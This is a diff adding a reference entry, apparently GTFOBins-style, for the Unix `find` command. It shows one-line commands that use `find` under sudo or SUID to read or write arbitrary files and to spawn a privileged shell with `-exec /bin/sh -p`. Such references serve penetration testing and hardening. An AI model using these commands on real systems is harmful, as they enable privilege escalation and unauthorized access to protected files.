@@ -1,0 +1,44 @@
+find
+====
+
+File read
+---------
+
+[Sudo]
+    find /path/to/input-file -exec cat {} \;
+    This uses `cat` to actually read the file, but since permissions are not dropped, it's executed with the same privileges as `find`.
+
+[SUID]
+    find /path/to/input-file -exec cat {} \;
+    This uses `cat` to actually read the file, but since permissions are not dropped, it's executed with the same privileges as `find`.
+
+[Unprivileged]
+    find /path/to/input-file -exec cat {} \;
+    This uses `cat` to actually read the file, but since permissions are not dropped, it's executed with the same privileges as `find`.
+
+File write
+----------
+
+[Sudo]
+    find / -fprintf /path/to/output-file DATA -quit
+    `DATA` is a format string, it supports some escape sequences.
+
+[SUID]
+    find / -fprintf /path/to/output-file DATA -quit
+    `DATA` is a format string, it supports some escape sequences.
+
+[Unprivileged]
+    find / -fprintf /path/to/output-file DATA -quit
+    `DATA` is a format string, it supports some escape sequences.
+
+Shell
+-----
+
+[Sudo]
+    find . -exec /bin/sh \; -quit
+
+[SUID]
+    find . -exec /bin/sh -p \; -quit
+
+[Unprivileged]
+    find . -exec /bin/sh \; -quit
